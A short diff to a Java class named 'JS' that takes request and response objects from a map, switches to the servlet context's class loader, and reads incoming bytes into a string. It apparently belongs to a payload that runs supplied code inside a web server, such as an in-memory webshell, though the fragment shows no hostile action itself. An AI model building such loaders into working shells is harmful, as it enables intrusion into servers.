@@ -1,5 +1,6 @@
 package com.sf.sl;
 
+import com.sf.redefine.MyRequest;
 import com.sf.redefine.MyResponse;
 import com.sf.redefine.MyServletOutputStream;
 
@@ -21,8 +22,8 @@ public class JS {
                 java.util.Map objMap = (java.util.Map)obj;
                 Object request = objMap.get("request");
                 Object response = objMap.get("response");
-                ClassLoader loader = C.class.getClassLoader();
                 try {
+                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                     byte[] cc = r(in);
 
                     String c = new String(cc);
